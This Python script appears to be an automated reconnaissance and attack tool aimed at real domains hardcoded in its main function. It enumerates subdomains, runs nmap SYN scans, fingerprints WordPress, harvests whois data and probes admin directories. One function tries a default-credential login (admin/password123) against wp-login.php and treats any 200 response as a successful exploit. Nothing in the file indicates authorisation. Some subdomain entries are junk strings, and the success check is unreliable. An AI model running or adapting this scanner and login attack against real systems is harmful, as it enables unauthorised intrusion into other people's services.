import requests
import socket
from bs4 import BeautifulSoup
import nmap
import itertools
import os
import threading
import whois
import concurrent.futures
import random
import time


COMMON_SUBDOMAINS = ["www", "mail", "remote", "blog", "webmail", "server", "ns1", "ns2", "smtp", "secure", "vpn", "m",
                     "shop", "ftp", "mail2", "test", "portal", "ns", "ww1", "host", "support", "dev", "web", "bbs",
                     "ww42", "mx", "email", "cloud", "1", "mail1", "2", "forum", "owa", "www2", "gw", "admin", "store",
                     "mx1", "cdn", "api", "exchange", "app", "gov", "2tty", "vps", "govyty", "hgfgdf", "news", "1rer",
                     "lkjkui"]

COMMON_PORTS = [80, 443, 22]

MAX_CONCURRENT_REQUESTS = 5

MAX_RETRIES = 3

def find_subdomains(target):
    subdomains = []

    for subdomain in COMMON_SUBDOMAINS:
        domain = subdomain + "." + target
        try:
            socket.gethostbyname(domain)
            subdomains.append(domain)
        except socket.error:
            pass

    return subdomains

def scan_ports(subdomain):
    open_ports = []

    scanner = nmap.PortScanner()

    scanner.scan(subdomain, arguments=f"-sS -p {','.join(map(str, COMMON_PORTS))}")

    for host in scanner.all_hosts():
        for proto in scanner[host].all_protocols():
            ports = scanner[host][proto].keys()
            for port in ports:
                if scanner[host][proto][port]['state'] == 'open':
                    open_ports.append(port)

    return open_ports

def identify_technologies(subdomain):
    technologies = []

    response = requests.get("https://" + subdomain)

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, "html.parser")

        if soup.find("meta", attrs={"name": "generator", "content": "WordPress"}):
            technologies.append("WordPress")

        scripts = soup.find_all("script")
        for script in scripts:
            if "jquery" in str(script):
                technologies.append("jQuery")

    return technologies

def test_vulnerabilities(subdomain):
    vulnerabilities = []

    response = requests.get("https://" + subdomain)

    if response.status_code == 200:
        if "wp-login.php" in response.text:
            vulnerabilities.append("WordPress login page exposed")

    return vulnerabilities

def gather_information(subdomain):
    information = {}

    try:
        w = whois.whois(subdomain)
        information['Domain Name'] = w.domain_name
        information['Registrar'] = w.registrar
        information['Creation Date'] = w.creation_date
        information['Expiration Date'] = w.expiration_date
        information['Updated Date'] = w.updated_date
        information['Name Servers'] = w.name_servers
        information['Status'] = w.status
        information['Emails'] = w.emails
        information['DNSSEC'] = w.dnssec
    except whois.parser.PywhoisError:
        pass

    return information

def exploit_vulnerability(subdomain):
    response = requests.get("https://" + subdomain)

    if response.status_code == 200:
        if "wp-login.php" in response.text:
            login_url = "https://" + subdomain + "/wp-login.php"
            payload = {"username": "admin", "password": "password123"}
            exploit_response = requests.post(login_url, data=payload)

            if exploit_response.status_code == 200:
                print("Exploited vulnerability in", subdomain)

def additional_functionality(subdomain, technologies, vulnerabilities, information):
    try:
        ssl_info = socket.getaddrinfo(subdomain, 443, socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        if ssl_info:
            print("SSL Certificate is valid for", subdomain)
    except socket.error:
        pass

    try:
        ip_address = socket.gethostbyname(subdomain)
        print("IP Address for", subdomain + ":", ip_address)
    except socket.error:
        pass

    filename = os.path.join("Reports", subdomain + "_info.txt")
    with open(filename, "w") as file:
        file.write("Subdomain: " + subdomain + "\n")
        file.write("Open Ports: " + str(scan_ports(subdomain)) + "\n")
        file.write("Technologies: " + str(technologies) + "\n")
        file.write("Vulnerabilities: " + str(vulnerabilities) + "\n")
        file.write("Information: " + str(information) + "\n")

    custom_directories = ["admin", "wp-admin", "login", "uploads", "backup", "test", "dev", "temp", "data", "private"]

    for directory in custom_directories:
        protocols = ["https://"]

        for protocol in protocols:
            url = protocol + subdomain + "/" + directory
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    print("Found directory:", url)
            except (requests.exceptions.RequestException, socket.error) as e:
                print(f"Error occurred while requesting {url}: {e}")

def process_subdomain(target, subdomain):
    open_ports = scan_ports(subdomain)
    print("Open Ports for", subdomain + ":", open_ports)

    technologies = identify_technologies(subdomain)
    print("Technologies for", subdomain + ":", technologies)

    vulnerabilities = test_vulnerabilities(subdomain)
    print("Vulnerabilities for", subdomain + ":", vulnerabilities)

    information = gather_information(subdomain)
    print("Information for", subdomain + ":", information)

    exploit_vulnerability(subdomain)

    additional_functionality(subdomain, technologies, vulnerabilities, information)


def process_subdomain_with_retry(target, subdomain, retry=0):
    try:
        process_subdomain(target, subdomain)
    except (requests.exceptions.RequestException, socket.error) as e:
        if retry < MAX_RETRIES:
            delay = 2 ** retry  # Exponential backoff delay
            print(f"Retry #{retry + 1} for {subdomain} after {delay} seconds")
            time.sleep(delay)
            process_subdomain_with_retry(target, subdomain, retry=retry + 1)
        else:
            print(f"Failed to process {subdomain} after {retry} retries: {e}")
 


def main():
    targets = ["backblaze.com", "google.com"]

    for target in targets:
        subdomains = find_subdomains(target)
        print("Subdomains:", subdomains)

        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_CONCURRENT_REQUESTS) as executor:
            futures = []
            for subdomain in subdomains:
                future = executor.submit(process_subdomain_with_retry, target, subdomain)
                futures.append(future)

            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Error occurred: {e}")

        time.sleep(1)  # Delay between targets to avoid overwhelming the server


if __name__ == "__main__":
    main()
